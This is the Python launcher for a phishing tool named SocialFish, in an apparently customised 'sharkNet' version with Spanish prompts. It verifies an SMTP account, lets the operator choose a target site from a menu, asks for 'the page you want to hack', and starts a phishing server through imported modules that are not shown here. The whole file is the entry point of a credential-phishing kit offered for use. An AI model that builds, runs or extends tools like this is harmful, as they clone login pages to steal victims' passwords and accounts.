#!/usr/bin/env python3

######################################################
#                                                    #
#       SOCIALFISH v2.0sharkNet                      #
#                                                    #
# Herramienta especializada para Lina <3             #
#                                                    #
#                                                    #
#                                                    #
#                                                    #
#                                                    #
######################################################

from sys import exit, version_info

if version_info<(3,0,0):
    print('[!] Please use Python 3. $ python3 SocialFish.py')
    exit(0)

from multiprocessing import Process

# Anti Newbie :)
try:
    from core.view import *
    from core.pre import *
except:
    import pip
    pip.main(['install', 'huepy'])
    pip.main(['install', 'wget'])
    from core.view import *
    from core.pre import *
    clear()
    
from core.phishingRunner import *
# from core.sites import site
from core.menu import main_menu
from core.email import objsmtp
from smtplib import *

def main():
    head()
    checkEd()    
    try:
        checkmail()
    except (SMTPAuthenticationError,ValueError):
        print(red(' [!] Tu autenticacion ha sido fallida'))
    except IndexError:
        print(red(' [!] Este dominio no esta soportado.'))

    site = main_menu()
    while True:
        custom = input(cyan('\n Inserta el link de la pagina que quieres hackear: > '))

        if not custom:
            pass
        else:
            break
    
    custom = 'http://' + custom if '://' not in custom else custom
    loadModule(site.lower())
    runPhishing(site.lower(), custom)

if __name__ == "__main__":
    try:        
        pre()
        main()
        PhishingServer()
    except KeyboardInterrupt:
        end()
        exit(0)
    finally:
        if objsmtp(): objsmtp().quit()
